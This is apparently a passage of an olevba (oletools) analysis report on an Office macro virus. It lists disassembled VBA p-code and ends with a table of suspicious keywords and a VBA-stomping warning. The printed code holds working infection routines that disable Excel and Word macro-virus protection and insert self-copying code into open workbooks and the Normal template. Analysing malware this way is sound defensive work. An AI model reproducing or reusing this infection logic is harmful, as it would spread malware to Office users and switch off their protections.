' Line #225:
' Line #226:
' 	Ld OurCode 
' 	Ld Chr13 
' 	Concat 
' 	Ld Comment 
' 	Concat 
' 	Ld TimeDate 
' 	Concat 
' 	Ld Chr13 
' 	Concat 
' 	Ld Comment 
' 	Concat 
' 	Ld UserNameTmp 
' 	Concat 
' 	Ld Chr13 
' 	Concat 
' 	Ld Comment 
' 	Concat 
' 	Ld UserAddy 
' 	Concat 
' 	Ld Chr13 
' 	Concat 
' 	St OurCode 
' Line #227:
' 	EndSub 
' Line #228:
' Line #229:
' 	FuncDefn (Private Sub InfectExcel(ByVal OurCode As String))
' Line #230:
' Line #231:
' 	OnError (Resume Next) 
' Line #232:
' Line #233:
' 	Dim 
' 	VarDefn Set1 (As Long)
' Line #234:
' 	Dim 
' 	VarDefn objExcel (As Object)
' Line #235:
' 	Dim 
' 	VarDefn RegKey
' 	VarDefn RegOptions (As String)
' Line #236:
' Line #237:
' 	LitStr 0x0045 "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
' 	St RegKey 
' Line #238:
' 	LitHI2 0x0000 
' 	St Set1 
' Line #239:
' 	LitStr 0x0008 "Options6"
' 	St RegOptions 
' Line #240:
' Line #241:
' 	Ld Set1 
' 	LitStr 0x0000 ""
' 	Ld RegKey 
' 	Ld RegOptions 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #242:
' Line #243:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0011 "Excel.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set objExcel 
' Line #244:
' Line #245:
' 	Dim (Const) 
' 	LitDI2 0x0001 
' 	VarDefn One
' 	LitDI2 0x0000 
' 	VarDefn Zero
' Line #246:
' Line #247:
' 	Dim 
' 	VarDefn ThaClass (As String)
' Line #248:
' 	Dim 
' 	VarDefn CounterI
' 	VarDefn CounterJ (As Integer)
' Line #249:
' Line #250:
' 	LitStr 0x000C "ThisWorkbook"
' 	St ThaClass 
' Line #251:
' Line #252:
' 	StartForVariable 
' 	Ld CounterI 
' 	EndForVariable 
' 	Ld One 
' 	Ld objExcel 
' 	MemLd Application 
' 	MemLd Workbooks 
' 	MemLd Count 
' 	For 
' Line #253:
' Line #254:
' 	StartForVariable 
' 	Ld CounterJ 
' 	EndForVariable 
' 	Ld One 
' 	Ld CounterI 
' 	Ld objExcel 
' 	MemLd Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #255:
' Line #256:
' 	Ld CounterJ 
' 	Ld CounterI 
' 	Ld objExcel 
' 	MemLd Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld Zero 
' 	Eq 
' 	IfBlock 
' Line #257:
' Line #258:
' 	Ld One 
' 	Ld OurCode 
' 	Ld CounterJ 
' 	Ld CounterI 
' 	Ld objExcel 
' 	MemLd Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #259:
' Line #260:
' 	Ld CounterJ 
' 	Ld CounterI 
' 	Ld objExcel 
' 	MemLd Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	Ld ThaClass 
' 	Eq 
' 	IfBlock 
' Line #261:
' 	LitDI2 0x0021 
' 	Ld One 
' 	Mul 
' 	LitStr 0x0021 "Private Sub Workbook_Deactivate()"
' 	Ld CounterJ 
' 	Ld CounterI 
' 	Ld objExcel 
' 	MemLd Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #262:
' 	ElseBlock 
' Line #263:
' 	Ld One 
' 	LitDI2 0x0021 
' 	Mul 
' 	LitStr 0x0022 "Private Sub Worksheet_Deactivate()"
' 	Ld CounterJ 
' 	Ld CounterI 
' 	Ld objExcel 
' 	MemLd Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #264:
' 	EndIfBlock 
' Line #265:
' Line #266:
' 	EndIfBlock 
' Line #267:
' Line #268:
' 	StartForVariable 
' 	Ld CounterJ 
' 	EndForVariable 
' 	NextVar 
' Line #269:
' Line #270:
' 	StartForVariable 
' 	Ld CounterI 
' 	EndForVariable 
' 	NextVar 
' Line #271:
' Line #272:
' Line #273:
' 	SetStmt 
' 	LitNothing 
' 	Set objExcel 
' Line #274:
' Line #275:
' 	EndSub 
' Line #276:
' Line #277:
' Line #278:
' 	FuncDefn (Private Sub InfectWord(ByVal OurCode As String))
' Line #279:
' Line #280:
' 	OnError (Resume Next) 
' Line #281:
' Line #282:
' 	Dim (Const) 
' 	LitVarSpecial (True)
' 	VarDefn Truex
' 	LitVarSpecial (False)
' 	VarDefn Falsex
' 	LitDI2 0x0001 
' 	VarDefn One
' 	LitDI2 0x0000 
' 	VarDefn Zero
' Line #283:
' 	Dim 
' 	VarDefn objWord (As Object)
' Line #284:
' 	Dim 
' 	VarDefn SaveNormalTemplate (As Boolean)
' Line #285:
' Line #286:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set objWord 
' Line #287:
' Line #288:
' 	Ld One 
' 	Ld objWord 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld Zero 
' 	Eq 
' 	IfBlock 
' Line #289:
' 	Ld objWord 
' 	MemLd NormalTemplate 
' 	MemLd Saved 
' 	St SaveNormalTemplate 
' Line #290:
' 	Ld Falsex 
' 	Ld objWord 
' 	MemLd Options 
' 	MemSt VirusProtection 
' Line #291:
' 	Ld One 
' 	Ld OurCode 
' 	Ld One 
' 	Ld objWord 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #292:
' 	Ld SaveNormalTemplate 
' 	Ld Truex 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld objWord 
' 	MemLd NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #293:
' 	EndIfBlock 
' Line #294:
' Line #295:
' 	SetStmt 
' 	LitNothing 
' 	Set objWord 
' Line #296:
' Line #297:
' 	EndSub 
' Line #298:
' Line #299:
' Line #300:
' Line #301:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

